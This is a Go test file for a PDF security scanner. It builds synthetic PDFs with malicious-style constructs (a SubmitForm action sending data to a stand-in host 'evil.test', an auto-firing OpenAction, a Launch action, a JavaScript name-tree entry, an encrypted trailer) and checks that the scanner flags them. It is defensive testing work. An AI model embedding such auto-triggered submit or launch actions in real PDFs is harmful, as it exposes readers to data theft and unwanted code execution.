package pdfscan

import (
	"bytes"
	"testing"
)

func TestEncryptedDocumentFailsClosed(t *testing.T) {
	b := newClassicBuilder(1)
	b.set(3, "<< /Type /Pages /Kids [] /Count 0 >>")
	b.set(1, "<< /Type /Catalog /Pages 3 0 R >>")
	data := b.build()
	// Inject an /Encrypt entry into the trailer.
	withEncrypt := bytes.Replace(data,
		[]byte("trailer\n<< /Size"),
		[]byte("trailer\n<< /Encrypt 7 0 R /Size"), 1)
	if bytes.Equal(withEncrypt, data) {
		t.Fatal("test setup failed to inject Encrypt entry")
	}
	if _, err := ScanBytes(withEncrypt); err == nil {
		t.Fatal("expected error for encrypted PDF")
	}
}

func TestEmptyAndGarbageRejected(t *testing.T) {
	if _, err := ScanBytes(nil); err == nil {
		t.Fatal("expected error for empty input")
	}
	if _, err := ScanBytes([]byte("hello world not pdf")); err == nil {
		t.Fatal("expected error for non-PDF input")
	}
}

func TestSubmitFormRejected(t *testing.T) {
	b := newClassicBuilder(1)
	b.set(3, "<< /Type /Pages /Kids [] /Count 0 >>")
	b.set(6, "<< /S /SubmitForm /F (https://evil.test/collect) >>")
	b.set(9, "<< /Type /Annot /Subtype /Widget /A 6 0 R >>")
	b.set(1, "<< /Type /Catalog /Pages 3 0 R /OpenAction 9 0 R >>")

	report, err := ScanBytes(b.build())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	assertFinding(t, report, 6, FindSubmitForm)
	assertFinding(t, report, 1, FindOpenAction)
}

func TestNameEscapeAtEndOfToken(t *testing.T) {
	// Escape as the final two bytes of the name (boundary condition).
	b := newClassicBuilder(1)
	b.set(3, "<< /Type /Pages /Kids [] /Count 0 >>")
	b.set(1, "<< /Type /Catalog /Pages 3 0 R /Open#41ction [3 0 R /Fit] >>")
	report, err := ScanBytes(b.build())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Destination array is not executable, so the document must pass.
	if report.Blocked() {
		t.Fatalf("destination OpenAction blocked: %+v", report.Findings)
	}
}

func TestLaunchActionViaPageAdditionalAction(t *testing.T) {
	b := newClassicBuilder(1)
	b.set(4, "<< /S /Launch /F (runme) >>")
	b.set(3, "<< /Type /Page /AA << /O 4 0 R >> >>")
	b.set(2, "<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
	b.set(1, "<< /Type /Catalog /Pages 2 0 R >>")

	report, err := ScanBytes(b.build())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	assertFinding(t, report, 3, FindAdditional)
	assertFinding(t, report, 4, FindLaunch)
}

func TestJavaScriptNameTreeReachable(t *testing.T) {
	b := newClassicBuilder(1)
	b.set(3, "<< /Type /Pages /Kids [] /Count 0 >>")
	b.set(8, "<< /S /JavaScript /JS (evil) >>")
	b.set(1, "<< /Type /Catalog /Pages 3 0 R /Names << /JavaScript [ (doc) 8 0 R ] >> >>")

	report, err := ScanBytes(b.build())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	assertFinding(t, report, 8, FindJavaScript)
}

func TestCarvingFallbackRecoversCatalog(t *testing.T) {
	// Remove the startxref pointer so the normal xref chain fails; carving
	// plus the trailer search should still locate a clean catalog.
	data := benignBuilder().build()
	corrupt := bytes.Replace(data, []byte("startxref"), []byte("startxreX"), 1)
	report, err := ScanBytes(corrupt)
	if err != nil {
		t.Fatalf("expected carving fallback, got error: %v", err)
	}
	if report.Blocked() {
		t.Fatalf("clean document blocked after recovery: %+v", report.Findings)
	}
}
